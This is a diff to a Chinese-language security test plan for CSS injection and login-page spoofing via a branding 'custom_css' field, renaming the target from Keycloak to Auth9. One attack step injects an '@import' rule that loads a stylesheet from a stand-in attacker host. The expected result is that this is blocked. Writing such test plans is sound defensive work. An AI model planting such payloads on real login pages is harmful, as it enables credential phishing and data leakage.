@@ -1,7 +1,7 @@
 # 高级攻击 - Theme CSS 注入与登录界面欺骗测试
 
 **模块**: 高级攻击
-**测试范围**: Keycloak Theme `custom_css` 注入、登录界面欺骗风险
+**测试范围**: Auth9 品牌认证页 `custom_css` 注入、登录界面欺骗风险
 **场景数**: 3
 **风险等级**: 🔴 极高
 **ASVS 5.0 矩阵ID**: M-ADV-07
@@ -15,7 +15,7 @@
 验证是否可通过 `custom_css` 引入外部样式资源影响登录页。
 ### 攻击步骤
 1. 以管理员身份更新 branding `custom_css`，注入 `@import url(https://attacker.example/x.css);`。
-2. 打开 Keycloak 登录页并抓包观察外连请求。
+2. 打开 Auth9 托管认证页并抓包观察外连请求。
 ### 预期安全行为
 - 外链 CSS 被拒绝或过滤。
 - 登录页不应向未授权域名发起请求。
